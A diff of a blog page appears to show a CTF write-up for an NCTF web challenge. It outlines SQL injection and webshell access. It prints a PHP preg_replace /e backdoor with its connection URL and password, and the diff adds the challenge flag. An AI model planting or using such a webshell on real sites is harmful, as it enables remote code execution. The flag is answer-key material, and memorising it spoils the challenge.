@@ -107,7 +107,7 @@
 <meta property="og:description" content="【综合题2】（[http://cms.nuptzj.cn/) 进入题目，发现是个留言板。下面有留言框，于是试试xss，结果写完xss语句点击预览时，根据提示，这题不是xss的题目。因为题目说是个综合题，肯定要后台getshell的，然后getshell的方法最容易想到的就是sql得到后台账号密码，然后用一句话木马加菜刀。于是接下来开始对这个网站收集信息。">
 <meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="http://yoursite.com/2018/04/15/nctf-综合题2/NNY4IAWO%7BQRVB@U8AJACGQY.png">
-<meta property="og:updated_time" content="2018-04-15T15:09:14.568Z">
+<meta property="og:updated_time" content="2018-04-15T15:24:48.536Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="nctf-综合题2 wp">
 <meta name="twitter:description" content="【综合题2】（[http://cms.nuptzj.cn/) 进入题目，发现是个留言板。下面有留言框，于是试试xss，结果写完xss语句点击预览时，根据提示，这题不是xss的题目。因为题目说是个综合题，肯定要后台getshell的，然后getshell的方法最容易想到的就是sql得到后台账号密码，然后用一句话木马加菜刀。于是接下来开始对这个网站收集信息。">
@@ -409,6 +409,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$e = $_REQUEST[&apos;www&apos;];</span><br><span class="line">$arr = array($_POST[&apos;wtf&apos;] =&gt; &apos;|.*|e&apos;,);</span><br><span class="line">array_walk($arr, $e, &apos;&apos;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 <p>这个对应了博文里的第四种情况。</p>
 <p>于是构建<a href="http://cms.nuptzj.cn/xlcteam.php?www=preg_replace，密码就是wtf。用菜刀连接即可。" target="_blank" rel="noopener">http://cms.nuptzj.cn/xlcteam.php?www=preg_replace，密码就是wtf。用菜刀连接即可。</a></p>
+<p>—–&gt;flag:nctf{you_are_s0_g00d_hacker}</p>
 
       
     </div>
